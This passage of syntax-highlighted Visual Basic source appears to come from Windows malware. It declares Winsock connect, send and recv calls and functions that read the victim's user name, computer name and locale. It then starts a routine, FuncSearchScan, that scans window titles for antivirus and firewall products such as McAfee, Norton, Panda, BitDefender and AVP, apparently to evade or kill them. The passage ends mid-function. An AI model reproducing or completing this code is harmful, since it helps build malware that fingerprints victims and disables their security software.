</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">SOCKET_ERROR</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">SOCK_STREAM</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">LingerType</span><span class="sc0">
</span><span class="sc7">l_onoff</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">l_linger</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">HostEnt</span><span class="sc0">
</span><span class="sc7">h_name</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">h_aliases</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">h_addrtype</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">h_length</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">h_addr_list</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">sockaddr</span><span class="sc0">
</span><span class="sc7">sin_family</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">sin_port</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">sin_addr</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">sin_zero</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">WSADATAType</span><span class="sc0">
</span><span class="sc7">wversion</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">wHighVersion</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">szDescription</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">WSADescription_Len</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">szSystemStatus</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">WSASYS_Status_Len</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">iMaxSockets</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">iMaxUdpDg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">lpszVendorInfo</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSAGetLastError</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSACleanup</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSAStartup</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wVR</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpWSAD</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">WSADATAType</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSAIsBlocking</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSACancelBlockingCall</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSAAsyncSelect</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wMsg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lEvent</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">gethostname</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hostname$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">HostLen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">gethostbyname</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hostname$</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"RtlMoveMemory"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Dest</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Src</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cb&amp;</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">connect</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">addr</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">sockaddr</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">namelen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">getsockopt</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">level</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">optname</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">optval</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">optlen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">htons</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hostshort</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">inet_addr</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cp</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">recv</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">buf</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">buflen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">flags</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">send</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">buf</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">buflen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">flags</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">setsockopt</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">level</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">optname</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">optval</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">optlen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">socket</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">af</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s_type</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">protocol</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc7">MySocket</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc7">rtncode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetSystemDefaultLangID</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetLocaleInfo</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetLocaleInfoA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Locale</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">LCType</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpLCData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cchData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">LOCALE_SNATIVELANGNAME</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H4</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">LOCALE_SCOUNTRY</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H6</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetUserName</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"advapi32.dll"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetUserNameA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetComputerName</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetComputerNameA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">FuncSearchScan</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Parametro</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">VirTitle</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Wt</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Wc</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VirWindow</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Vc</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">Vc</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"scan"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Vc</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"virus"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Vc</span><span class="sc6">(</span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"trojan"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Vc</span><span class="sc6">(</span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"panda"</span><span class="sc0">
</span><span class="sc7">Vc</span><span class="sc6">(</span><span class="sc2">5</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"mcafee"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Vc</span><span class="sc6">(</span><span class="sc2">6</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"firewall"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Vc</span><span class="sc6">(</span><span class="sc2">7</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"bitdefender"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Vc</span><span class="sc6">(</span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"security"</span><span class="sc0">
</span><span class="sc7">Vc</span><span class="sc6">(</span><span class="sc2">9</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"norton"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Vc</span><span class="sc6">(</span><span class="sc2">10</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"norman"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Vc</span><span class="sc6">(</span><span class="sc2">11</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"the hacker"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Vc</span><span class="sc6">(</span><span class="sc2">12</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"thav"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Vc</span><span class="sc6">(</span><span class="sc2">13</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"avp"</span><span class="sc0">

</span><span class="sc7">DoEvents</span><span class="sc0">

